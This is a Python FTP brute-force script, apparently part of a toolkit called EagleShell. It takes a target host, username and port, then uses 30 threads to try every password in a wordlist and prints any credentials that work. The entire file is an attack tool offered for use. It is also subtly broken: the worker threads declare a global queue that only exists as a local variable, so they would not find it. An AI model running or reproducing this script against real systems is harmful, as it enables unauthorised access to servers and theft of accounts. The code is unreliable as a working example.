#!/usr/bin/python3

# BruteFTP - FTP Brute Force Script

# Imports all needed variables and packages
from assets.banners import bruteftp_banner
from assets.designs import *
from assets.properties import clear_screen
from assets.redirect import redirect_eagleshell_brute_force
from assets.redirect import redirect_eagleshell_menu
import os
import ftplib
from threading import Thread
import queue
import colorama
from colorama import Fore, Style


# Main function
def bruteftp_main():

    # init the console for colors (for Windows)
    # init()
    # initialize the queue
    q = queue.Queue()
    # number of threads to spawn
    n_threads = 30

    # Function that takes some user input
    def configuration():
        try:
            global host_set
            global user_set
            global port_set
            os.system(clear_screen)
            print(logo)
            print('')
            print(line)
            print(bruteftp_banner)
            print(line)
            print('')
            print(author)
            print('Configuration:')
            print('')
            # hostname or IP address of the FTP server
            print('Host Input')
            print('Example: 10.10.10.15')
            print('')
            # username of the FTP server, root as default for linux
            print('User Input:')
            print('Example: admin')
            print('')
            # port of FTP, aka 21
            print('Port Input')
            print('Example: 21')
            print('')
            print('\tZ): Back')
            print('\tX): Exit')
            host_set = input('\u001b[33mHOST \u001b[37m> ').lower()
            user_set = input('\u001b[33mUSER \u001b[37m> ').lower()
            port_set = input('\u001b[33mPORT \u001b[37m> ').lower()
            if host_set == 'z' or user_set == 'z' or port_set == 'z':
                bruteftp_main()
            elif host_set == 'x' or user_set == 'x' or port_set == 'x':
                exit_shell()
            brute_forcing()
        except KeyboardInterrupt:
            exit_shell()

    # Function that connects to FTP
    def connect_ftp():
        global q
        while True:
            # get the password from the queue
            password = q.get()
            # initialize the FTP server object
            server = ftplib.FTP()
            print("[!] Trying", password)
            try:
                # tries to connect to FTP server with a timeout of 5
                server.connect(host_set, port_set, timeout=5)
                # login using the credentials (user & password)
                server.login(user_set, password)
            except ftplib.error_perm:
                # login failed, wrong credentials
                pass
            else:
                # correct credentials
                print(f"{Fore.GREEN}[+] Found credentials: ")
                print(f"\tHost: {host_set}")
                print(f"\tUser: {user_set}")
                print(f"\tPassword: {password}{Fore.RESET}")
                # we found the password, let's clear the queue
                with q.mutex:
                    q.queue.clear()
                    q.all_tasks_done.notify_all()
                    q.unfinished_tasks = 0
            finally:
                # notify the queue that the task is completed for this password
                q.task_done()

    # Function that does the brute force
    def brute_forcing():
        # read the wordlist of passwords
        passwords = open("/opt/EagleShell/wordlist.txt").read().split("\n")

        print("[+] Passwords to try:", len(passwords))

        # put all passwords to the queue
        for password in passwords:
            q.put(password)

        # create `n_threads` that runs that function
        for t in range(n_threads):
            thread = Thread(target=connect_ftp)
            # will end when the main thread end
            thread.daemon = True
            thread.start()
        # wait for the queue to be empty
        q.join()

    # The function where you exit
    def exit_shell():
        from assets.functions import exit_main
        exit_main()

    configuration()


bruteftp_main()
